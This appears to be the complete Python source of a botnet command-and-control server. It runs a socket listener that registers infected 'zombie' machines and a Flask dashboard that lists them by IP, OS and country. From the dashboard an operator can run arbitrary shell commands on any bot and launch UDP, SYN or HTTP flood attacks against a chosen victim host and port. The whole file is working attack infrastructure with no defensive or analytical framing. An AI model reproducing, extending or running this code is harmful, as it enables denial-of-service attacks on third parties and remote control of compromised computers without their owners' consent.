import socket
import threading
import pickle
import time
import platform
import os
from flask import Flask, render_template_string, request, redirect, url_for, Response, make_response

app = Flask(__name__)
HOST = '0.0.0.0'
SOCKET_PORT = 4444
PICKLE_FILE = 'bots.pkl'
bots = {}
sessions = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Zombies Online</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 20px; }
        nav { margin-bottom: 20px; }
        nav a { color: deepskyblue; margin-right: 15px; text-decoration: none; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; text-align: left; }
        th { background-color: #222; }
        .online { color: lime; }
        .offline { color: red; }
    </style>
</head>
<body>
    <nav>
        <a href="/">Dashboard</a>
        <a href="/attack">Attack</a>
    </nav>
    <h1>Zombies Online: {{ online_count }}</h1>
    <form method="POST" action="/save-selection">
        <table>
            <tr>
                <th>Select</th>
                <th>ID</th>
                <th>Status</th>
                <th>IP</th>
                <th>OS</th>
                <th>Country</th>
                <th>Shell</th>
            </tr>
            {% for bot_id, info in bots.items() %}
            <tr>
                <td>
                    <input type="checkbox" name="selected_bots" value="{{ bot_id }}"
                    {% if bot_id in selected_bots %}checked{% endif %}>
                </td>
                <td>{{ bot_id }}</td>
                <td class="{{ 'online' if info['status'] == 'Online' else 'offline' }}">{{ info['status'] }}</td>
                <td>{{ info['ip'] }}</td>
                <td>{{ info['os'] }}</td>
                <td>{{ info['country'] }}</td>
                <td><a href="/shell-id={{ bot_id }}">🖹</a></td>
            </tr>
            {% endfor %}
        </table>
        <button type="submit">Save Selection</button>
    </form>
</body>
</html>
"""

SHELL_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Shell for Bot {{ bot_id }}</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 20px; }
        form { margin-bottom: 20px; }
        input[type="text"] { width: 90%; padding: 10px; background: #222; color: #eee; border: 1px solid #444; }
        textarea { width: 100%; height: 300px; background: #222; color: #0f0; font-family: monospace; }
        button { padding: 10px; background: deepskyblue; color: #fff; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Shell for Bot {{ bot_id }}</h1>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command">
        <button type="submit">Execute</button>
    </form>
    <textarea readonly>{{ output }}</textarea>
    <br><a href='/'>← Back to Dashboard</a>
</body>
</html>
"""

ATTACK_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Launch Attack</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 20px; }
        label { display: block; margin-bottom: 5px; }
        input, select { width: 100%; margin-bottom: 10px; padding: 10px; background: #222; color: #eee; border: 1px solid #444; }
        button { padding: 10px; background: deepskyblue; color: #fff; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Launch DDoS Attack</h1>
    <form method="POST">
        <label>Victim:</label>
        <input type="text" name="victim" required>
        
        <label>Port:</label>
        <input type="number" name="port" required>
        
        <label>Type:</label>
        <select name="type" required>
            <option value="UDP">UDP</option>
            <option value="SYN">SYN</option>
            <option value="HTTP">HTTP</option>
        </select>
        
        <label>Threads:</label>
        <input type="number" name="threads" required>
        
        <p><strong>Selected Bots:</strong> {{ selected_bots|join(', ') }}</p>
        <button type="submit">Launch Attack</button>
    </form>
</body>
</html>
"""

def save_bots():
    with open(PICKLE_FILE, 'wb') as f:
        pickle.dump(bots, f)

def load_bots():
    global bots
    if os.path.exists(PICKLE_FILE):
        with open(PICKLE_FILE, 'rb') as f:
            bots = pickle.load(f)

def update_bot(ip, os_name, country):
    for bot_id, info in bots.items():
        if info['ip'] == ip:
            bots[bot_id].update({
                'status': 'Online',
                'last_seen': time.time(),
                'os': os_name,
                'country': country
            })
            save_bots()
            return bot_id
    bot_id = str(len(bots) + 1)
    bots[bot_id] = {
        'ip': ip,
        'status': 'Online',
        'last_seen': time.time(),
        'os': os_name,
        'country': country
    }
    save_bots()
    return bot_id

def socket_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, SOCKET_PORT))
    s.listen(5)
    print(f"[+] Socket server listening on {HOST}:{SOCKET_PORT}")
    while True:
        conn, addr = s.accept()
        ip = addr[0]
        try:
            client_info = conn.recv(1024).decode()
            os_name, country = client_info.split("\nCountry: ")
            bot_id = update_bot(ip, os_name, country)
            sessions[bot_id] = conn
            print(f"[+] Bot {bot_id} ({ip}) connected")
        except:
            conn.close()

def cleanup_loop():
    while True:
        now = time.time()
        for bot_id in list(bots):
            last_seen = bots[bot_id]['last_seen']
            if now - last_seen > 15:
                bots[bot_id]['status'] = 'Offline'
        save_bots()
        time.sleep(5)

@app.route('/')
def dashboard():
    selected_bots = request.cookies.get('selected_bots', '').split(',')
    online_count = sum(1 for b in bots.values() if b['status'] == 'Online')
    return render_template_string(HTML_TEMPLATE, bots=bots, online_count=online_count, selected_bots=selected_bots)

@app.route('/save-selection', methods=['POST'])
def save_selection():
    selected_bots = request.form.getlist('selected_bots')
    response = make_response(redirect('/'))
    response.set_cookie('selected_bots', ','.join(selected_bots))
    return response

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    selected_bots = request.cookies.get('selected_bots', '').split(',')
    if request.method == 'POST':
        victim = request.form['victim']
        port = int(request.form['port'])
        attack_type = request.form['type']
        threads = int(request.form['threads'])

        for bot_id in selected_bots:
            conn = sessions.get(bot_id)
            if conn:
                try:
                    command = f"ATTACK {victim} {port} {attack_type} {threads}"
                    conn.send(command.encode())
                except Exception as e:
                    print(f"Error sending attack command to bot {bot_id}: {e}")

        return f"Attack command sent to selected bots targeting {victim}:{port} with {attack_type} ({threads} threads)."
    return render_template_string(ATTACK_TEMPLATE, selected_bots=selected_bots)

@app.route('/shell-id=<bot_id>', methods=['GET', 'POST'])
def shell(bot_id):
    output = ''
    if request.method == 'POST':
        cmd = request.form['cmd']
        try:
            conn = sessions.get(bot_id)
            if conn:
                conn.send(cmd.encode())
                data = conn.recv(4096).decode()
                output = data
        except Exception as e:
            output = f"Error: {e}"
    return render_template_string(SHELL_TEMPLATE, bot_id=bot_id, output=output)

if __name__ == '__main__':
    load_bots()
    threading.Thread(target=socket_listener, daemon=True).start()
    threading.Thread(target=cleanup_loop, daemon=True).start()
    app.run(host='127.0.0.1', port=80)
